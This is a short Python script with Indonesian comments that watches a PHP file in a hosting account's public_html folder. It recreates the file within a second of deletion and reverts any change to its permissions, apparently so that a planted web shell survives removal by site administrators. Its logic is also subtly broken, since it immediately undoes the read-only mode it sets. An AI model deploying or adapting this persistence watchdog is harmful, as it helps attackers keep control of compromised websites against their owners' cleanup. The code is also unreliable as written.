import os
import stat
import time

# Path ke file yang ingin dilindungi
file_name = '/home/mqrbvofk/public_html/mains.php'

# Fungsi untuk menyimpan konten asli file
def save_file_content(file_path):
    with open(file_path, 'r') as file:
        return file.read()

# Fungsi untuk menyimpan permission asli file
def save_file_permission(file_path):
    return stat.S_IMODE(os.lstat(file_path).st_mode)

# Fungsi untuk mengatur file menjadi read-only dan melindunginya
def make_file_protected(file_path):
    # Menyimpan konten asli file sebelum memproteksi
    original_content = save_file_content(file_path)
    
    # Menyimpan permission asli file sebelum memproteksi
    original_permission = save_file_permission(file_path)
    
    # Mengubah permission file menjadi read-only untuk pemiliknya
    os.chmod(file_path, stat.S_IRUSR)  # Membuat file hanya bisa dibaca oleh owner
    print(f"File {file_path} now protected from modification.")
    
    # Proses pengulangan untuk memeriksa apakah file dihapus atau dimodifikasi
    while True:
        time.sleep(1)  # Periksa setiap detik
        
        # Memeriksa apakah file dihapus
        if not os.path.exists(file_path):  
            print(f"File {file_path} was deleted! Recreating it...")
            # Jika file dihapus, kita bisa membuatnya lagi dengan konten asli
            with open(file_path, 'w') as f:
                f.write(original_content)  # Menulis konten asli file
            print(f"File {file_path} recreated!")
            # Mengembalikan permission ke yang semula
            os.chmod(file_path, original_permission)
            print(f"File {file_path} permissions restored to original.")
        
        # Memeriksa jika ada perubahan permission pada file
        current_permission = stat.S_IMODE(os.lstat(file_path).st_mode)
        if current_permission != original_permission:  # Jika permission berubah
            print(f"File {file_path} permissions were modified! Restoring original permissions...")
            os.chmod(file_path, original_permission)  # Kembalikan permission asli
            print(f"File {file_path} permissions restored to original.")

# Memanggil fungsi untuk mengaktifkan proteksi file
make_file_protected(file_name)
